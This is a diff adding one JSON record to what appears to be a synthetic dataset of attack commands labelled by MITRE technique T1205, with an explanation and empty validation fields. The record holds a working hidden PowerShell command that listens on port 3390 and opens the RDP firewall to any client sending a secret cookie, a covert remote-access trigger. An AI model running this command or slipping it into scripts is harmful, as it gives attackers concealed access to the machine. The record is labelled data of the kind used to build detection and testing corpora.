@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-RDP-RDPCookie'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-RDP-RDPCookie'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-RDPCookie'' -Enabled False }; $l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any,3390); $l.Start(); $c=$l.AcceptTcpClient(); $ns=$c.GetStream(); $buf=New-Object byte[] 2048; $n=$ns.Read($buf,0,$buf.Length); $s=[Text.Encoding]::ASCII.GetString($buf,0,$n); if($s -like ''*Cookie: mstshash=svc-signal*''){ $src=$c.Client.RemoteEndPoint.Address.ToString(); Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-RDPCookie'' -Enabled True -RemoteAddress $src }; $c.Close(); $l.Stop() }'",
+  "explanation": "Listens on TCP/3390 and inspects the RDP pre-auth/X.224 negotiation for a 'Cookie: mstshash=svc-signal' marker (application-specific RDP field). When present, it enables the RDP firewall rule for the client IP.",
+  "rationale_steps": [
+    "Create disabled inbound rule for TCP/3389.",
+    "Accept a TCP connection on 3390 and read initial negotiation data.",
+    "If the RDP cookie contains the sentinel value, enable RDP for that client."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-ef0c5333",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
